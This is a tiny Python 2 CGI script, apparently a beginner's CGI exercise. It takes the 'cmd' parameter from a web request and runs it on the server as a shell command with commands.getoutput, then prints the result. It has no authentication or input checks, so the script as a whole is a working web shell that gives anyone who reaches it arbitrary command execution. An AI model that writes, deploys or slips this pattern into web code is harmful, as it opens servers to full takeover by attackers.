#!/usr/bin/python2

import commands
import cgi 

print "Content-Type: text/html; charset=UTF-8 \n"
print "This is python coding\n\n"

x=cgi.FormContent()

print "<pre>"
print commands.getoutput(x['cmd'][0])
print "</pre>"
